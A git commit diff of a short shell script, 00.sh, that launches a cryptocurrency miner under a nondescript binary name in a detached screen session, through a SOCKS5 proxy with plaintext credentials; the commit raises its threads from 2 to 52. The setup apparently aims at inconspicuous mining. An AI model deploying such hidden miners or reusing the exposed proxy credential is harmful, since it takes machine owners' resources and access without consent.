6cca73894c5e3144b696d6d7b234925dbecb3a6f
03081997 <86400154+03081997@users.noreply.github.com>
2021-06-28 22:43:12 +0700

    Update 00.sh

--- 00.sh
+++ 00.sh
@@ -5,4 +5,4 @@ screen -dmS ls
 POOL=1pool.sugarchain.org:3333
 WALLET=sugar1qe40q8krx7elqg84lcn6j8qqzjcpgyf6p8ac92x.adz
 PROXY=socks5://ilbbkwmp:qwe2bptzjsss@209.127.191.180:9279
-./00 -a yespowerSUGAR -o $POOL -u $WALLET -t2 -x $PROXY -q
+./00 -a yespowerSUGAR -o $POOL -u $WALLET -t52 -x $PROXY -q
